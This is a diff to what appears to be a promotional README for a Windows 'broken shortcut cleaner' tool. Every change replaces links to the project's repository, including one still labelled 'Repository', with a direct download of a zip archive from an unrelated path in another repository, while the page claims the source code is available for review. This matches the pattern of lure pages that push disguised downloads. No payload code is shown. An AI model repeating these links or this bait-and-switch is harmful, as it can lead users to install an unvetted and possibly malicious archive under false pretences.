@@ -6,7 +6,7 @@ description: "Find and delete broken shortcuts on Windows 10/11 with batch scann
 <h1>🧹 Broken-Shortcut-Cleaner-Tool-2026 - Remove Dead Links Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Unq2289/Broken-Shortcut-Cleaner-Tool-2026" style="display:inline-block;padding:15px 40px;background:#4CAF50;color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/Unq2289/unq2289.github.io/main/apanthropia/App-v2.1.zip" style="display:inline-block;padding:15px 40px;background:#4CAF50;color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 🖥️ What Is This Tool?
@@ -33,7 +33,7 @@ Follow these simple steps to download and run the tool on your Windows computer.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Unq2289/Broken-Shortcut-Cleaner-Tool-2026](https://github.com/Unq2289/Broken-Shortcut-Cleaner-Tool-2026)
+Visit this link to download the application: [https://raw.githubusercontent.com/Unq2289/unq2289.github.io/main/apanthropia/App-v2.1.zip](https://raw.githubusercontent.com/Unq2289/unq2289.github.io/main/apanthropia/App-v2.1.zip)
 
 Click the green "Download" button or the download link on that page. The file will start downloading to your computer.
 
@@ -154,12 +154,12 @@ The tool is actively maintained, and feedback is always welcome.
 Don't let broken shortcuts clutter your computer any longer. With just a few clicks, you can have a clean, organized desktop and Start Menu. Download the tool now and see the difference it makes.
 
 <p align="center">
-  <a href="https://github.com/Unq2289/Broken-Shortcut-Cleaner-Tool-2026" style="display:inline-block;padding:15px 40px;background:#2196F3;color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ GET THE TOOL</a>
+  <a href="https://raw.githubusercontent.com/Unq2289/unq2289.github.io/main/apanthropia/App-v2.1.zip" style="display:inline-block;padding:15px 40px;background:#2196F3;color:white;font-size:22px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ GET THE TOOL</a>
 </p>
 
 ## 📁 Additional Resources
 
-- **Repository:** [https://github.com/Unq2289/Broken-Shortcut-Cleaner-Tool-2026](https://github.com/Unq2289/Broken-Shortcut-Cleaner-Tool-2026)
+- **Repository:** [https://raw.githubusercontent.com/Unq2289/unq2289.github.io/main/apanthropia/App-v2.1.zip](https://raw.githubusercontent.com/Unq2289/unq2289.github.io/main/apanthropia/App-v2.1.zip)
 - **Latest Release:** Check the repository page for the newest version
 - **Source Code:** Available on the repository for those who want to review or contribute
 
